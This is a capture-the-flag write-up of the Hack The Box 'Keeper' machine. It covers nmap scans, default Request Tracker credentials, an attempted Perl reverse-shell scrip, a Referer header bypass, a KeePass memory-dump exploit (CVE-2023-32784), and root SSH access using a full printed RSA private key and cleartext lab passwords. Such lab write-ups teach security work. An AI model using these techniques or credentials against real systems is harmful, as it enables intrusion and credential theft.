# Keeper - Easy

Target IP: **10.129.229.41**

## User Flag

Initial scan: ```sudo nmap --open 10.129.229.41 -vvv```

TCP Port 22 for ssh and 80 for http. Standard.

```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-11 17:02 EDT
Initiating Ping Scan at 17:02
Scanning 10.129.229.41 [4 ports]
Completed Ping Scan at 17:02, 0.02s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 17:02
Completed Parallel DNS resolution of 1 host. at 17:02, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 17:02
Scanning 10.129.229.41 [1000 ports]
Discovered open port 80/tcp on 10.129.229.41
Discovered open port 22/tcp on 10.129.229.41
Completed SYN Stealth Scan at 17:02, 0.27s elapsed (1000 total ports)
Nmap scan report for 10.129.229.41
Host is up, received reset ttl 63 (0.015s latency).
Scanned at 2026-09-11 17:02:47 EDT for 0s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.39 seconds
           Raw packets sent: 1004 (44.152KB) | Rcvd: 1002 (40.132KB)
```

Service and connect scan: ```sudo nmap -sC -sV 10.129.229.41 -v```

A website is being hosted by Nginx 1.18.0 on port 80.

```
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Let's navigate to it. The website tells us to visit ```tickets.keeper.htb/rt``` to submit an IT support ticket.

![1](Screenshots/Keeper_1.jpg)

Let's add the new url to our hosts file and visit it. We are met with a login page and details about the application running on it. It seems to be Request Tracker version ```4.4.4```.

![2](Screenshots/Keeper_2.jpg)

Let's see if we can get an easy win here. Looking online, Request Tracker's default credentials are ```root:password```.

The credentials worked, and we are lead to this home page.

![3](Screenshots/Keeper_3.jpg)

What stands out to me here is the queue list, where a preexisting new ticket is shown, and the quick ticket creation form.

Let's take a look at the new ticket. The ticket is about an issue with a KeePass client which the ```webmaster@keeper.htb``` email actually attached a crash dump of in the ticket, but unfortunately deleted it afterwards. The ticket talks about a Windows client, despite the target machine being Linux, but it might be good to keep in mind we could see a ```.kdbx``` file on the remote machine after initial access.

![4](Screenshots/Keeper_4.jpg)

Let's analyze the ticket creation form. We can create a junk ticket and capture it on Burp Suite to take a deeper look.

The form sends a POST request to ```/rt/index.html```. A cookie value is set for our session, and the parameters are ```QuickCreate```, ```Subject```, ```Queue```, ```Owner```, ```Requestors```, and ```Content```.

However, when forwarding the request, we are met with a cross-site request forgery error and cannot perform the action.

```
POST /rt/index.html HTTP/1.1
Host: tickets.keeper.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://tickets.keeper.htb/rt/
Content-Type: application/x-www-form-urlencoded
Content-Length: 80
Origin: http://tickets.keeper.htb
DNT: 1
Connection: keep-alive
Cookie: RT_SID_tickets.keeper.htb.80=1f4e286b61611dbe0b0c8d77f4517414
Upgrade-Insecure-Requests: 1
Priority: u=0, i

QuickCreate=1&Subject=hi&Queue=1&Owner=14&Requestors=root%40localhost&Content=hi
```

I couldn't do much with this, so I looked elsewhere. We have the ability to create global ```scrips```, which was interesting. These scrips run perl code, so if we can put in a perl reverse shell as the code to be executed when a certain action is executed, we might get a connection back.

The intention was to create this scrip so that when a comment is posted, the reverse shell code is executed.

![5](Screenshots/Keeper_5.jpg)

Let's try it.

We get the same error as above. There seems to be a configuration of some sort that prevents us from creating new objects like tickets and scrips.

![6](Screenshots/Keeper_6.jpg)

The error message says this was happening because "the Referrer header supplied by your browser (tickets.keeper.htb:80) is not allowed by RT's configured hostname (keeper.htb:80)." If so, we could capture the request and change the Referrer header to the specified header value. 

![7](Screenshots/Keeper_7.jpg)

After doing so, our scrip is successfully created.

![8](Screenshots/Keeper_8.jpg)

Now, let's try posting a comment and seeing if the reverse shell code executes.

![9](Screenshots/Keeper_9.jpg)

It didn't work. 

I can feel myself getting into a rabbit hole, so let's pivot.

Exploring the website more, I stumbled upon the 'users' option and selected it. Looking at the ```lnorgaard``` user's details, we can see the user's initial password written in a comments box in cleartext.

![10](Screenshots/Keeper_10.jpg)

Let's try using ```lnorgaard:Welcome2023!``` to log in through SSH.

```
lnorgaard@10.129.229.41's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
You have mail.
Last login: Tue Aug  8 11:31:22 2023 from 10.10.14.23
lnorgaard@keeper:~$ 
```

We're in! We can get the user flag from here.

## Root Flag

In the ```lnorgaard``` user's home directory, there is a zip file named ```RT30000.zip```. The 'RT' most likely stands for Request Tracker, and 30000 matches the number on the ticket we saw on the website. This leads to me to believe that this zip file contains the KeePass dump file.

Unzipping the file, we see a ```.dmp``` and ```.kdbx``` file.

```
lnorgaard@keeper:~$ ls
RT30000.zip  user.txt
lnorgaard@keeper:~$ file RT30000.zip 
RT30000.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
lnorgaard@keeper:~$ unzip RT30000.zip 
Archive:  RT30000.zip
  inflating: KeePassDumpFull.dmp     
 extracting: passcodes.kdbx          
```

Simply searching "KeePass dmp" gives us a promising vulnerability, CVE-2023-32784, where we can extract and recover a KeePass master password from a memory dump file.

Let's look for a PoC. The original exploit was designed to be ran with .NET on Windows, but I found a python version of it [here](https://raw.githubusercontent.com/matro7sh/keepass-dump-masterkey/refs/heads/main/poc.py).

Let's transfer this script over to the remote machine and try it.

```
lnorgaard@keeper:~$ python3 poc.py KeePassDumpFull.dmp 
2026-09-12 00:27:11,945 [.] [main] Opened KeePassDumpFull.dmp
Possible password: ●,dgr●d med fl●de
Possible password: ●ldgr●d med fl●de
Possible password: ●`dgr●d med fl●de
Possible password: ●-dgr●d med fl●de
Possible password: ●'dgr●d med fl●de
Possible password: ●]dgr●d med fl●de
Possible password: ●Adgr●d med fl●de
Possible password: ●Idgr●d med fl●de
Possible password: ●:dgr●d med fl●de
Possible password: ●=dgr●d med fl●de
Possible password: ●_dgr●d med fl●de
Possible password: ●cdgr●d med fl●de
Possible password: ●Mdgr●d med fl●de
```

We don't get the whole password from the script, but searching the characters we got gives us "rødgrød med fløde," a classic Danish summer dessert. Password makes sense as ```lnorgaard``` is a very Danish username.

I transferred the ```.kdbx``` file over to the attack box, installed ```KeePassXC```, and opened the file using the master password.

![11](Screenshots/Keeper_11.jpg)

Digging around, we see an entry with ssh putty key details written in the notes section for ```root```.

![12](Screenshots/Keeper_12.jpg)

We can copy this whole text, put it in a file, then use ```puttygen``` to generate us an openssh private key for us to use, then finally log in through ssh as ```root```.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-cg3ueamrbo]─[~]
└──╼ [★]$ puttygen key -O private-openssh -o id_rsa
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-cg3ueamrbo]─[~]
└──╼ [★]$ cat id_rsa 
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAp1arHv4TLMBgUULD7AvxMMsSb3PFqbpfw/K4gmVd9GW3xBdP
c9DzVJ+A4rHrCgeMdSrah9JfLz7UUYhM7AW5/pgqQSxwUPvNUxB03NwockWMZPPf
Tykkqig8VE2XhSeBQQF6iMaCXaSxyDL4e2ciTQMt+JX3BQvizAo/3OrUGtiGhX6n
FSftm50elK1FUQeLYZiXGtvSQKtqfQZHQxrIh/BfHmpyAQNU7hVW1Ldgnp0lDw1A
MO8CC+eqgtvMOqv6oZtixjsV7qevizo8RjTbQNsyd/D9RU32UC8RVU1lCk/LvI7p
5y5NJH5zOPmyfIOzFy6m67bIK+csBegnMbNBLQIDAQABAoIBAQCB0dgBvETt8/UF
NdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6joDni1wZdo7hTpJ5Zjdmz
wxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCihkmyZTZOV9eq1D6P1uB6A
XSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputYf7n24kvL0WlBQThsiLkK
cz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzTVkCew1DZuYnYOGQxHYW6
WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivzUXjcCAviPpmSXB19UG8J
lTpgORyhAoGBAPaR+FID78BKtzThkhVqAKB7VCryJaw7Ebx6gIxbwOGFu8vpgoB8
S+PfF5qFd7GVXBQ5wNc7tOLRBJXaxTDsTvVy+X8TEbOKfqrKndHjIBpXs+Iy0tOA
GSqzgADetwlmklvTUBkHxMEr3VAhkY6zCLf+5ishnWtKwY3UVsr+Z4f1AoGBAK28
/Glmp7Kj7RPumHvDatxtkdT2Iaecl6cYhPPS/OzSFdPcoEOwHnPgtuEzspIsMj2j
gZZjHvjcmsbLP4HO6PU5xzTxSeYkcol2oE+BNlhBGsR4b9Tw3UqxPLQfVfKMdZMQ
a8QL2CGYHHh0Ra8D6xfNtz3jViwtgTcBCHdBu+lZAoGAcj4NvQpf4kt7+T9ubQeR
RMn/pGpPdC5mOFrWBrJYeuV4rrEBq0Br9SefixO98oTOhfyAUfkzBUhtBHW5mcJT
jzv3R55xPCu2JrH8T4wZirsJ+IstzZrzjipe64hFbFCfDXaqDP7hddM6Fm+HPoPL
TV0IDgHkKxsW9PzmPeWD2KUCgYAt2VTHP/b7drUm8G0/JAf8WdIFYFrrT7DZwOe9
LK3glWR7P5rvofe3XtMERU9XseAkUhTtqgTPafBSi+qbiA4EQRYoC5ET8gRj8HFH
6fJ8gdndhWcFy/aqMnGxmx9kXdrdT5UQ7ItB+lFxHEYTdLZC1uAHrgncqLmT2Wrx
heBgKQKBgFViaJLLoCTqL7QNuwWpnezUT7yGuHbDGkHl3JFYdff0xfKGTA7iaIhs
qun2gwBfWeznoZaNULe6Khq/HFS2zk/Gi6qm3GsfZ0ihOu5+yOc636Bspy82JHd3
BE5xsjTZIzI66HH5sX5L7ie7JhBTIO2csFuwgVihqM4M+u7Ss/SL
-----END RSA PRIVATE KEY-----
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-cg3ueamrbo]─[~]
└──╼ [★]$ sudo chmod 600 id_rsa
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-cg3ueamrbo]─[~]
└──╼ [★]$ ssh root@10.129.229.41 -i id_rsa
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

You have new mail.
Last login: Tue Aug  8 19:00:06 2023 from 10.10.14.41
root@keeper:~# 
```

We can proceed to get the root flag.

Nice pwn!

## Contact

Email: <johnyang4406@gmail.com>, <john_s_yang@brown.edu>

LinkedIn: <https://www.linkedin.com/in/john-yang-747726292/>

HackTheBox: <https://profile.hackthebox.com/profile/019c423f-9b9b-708f-8b31-55983b89dddd?utm_medium=copy_url/>
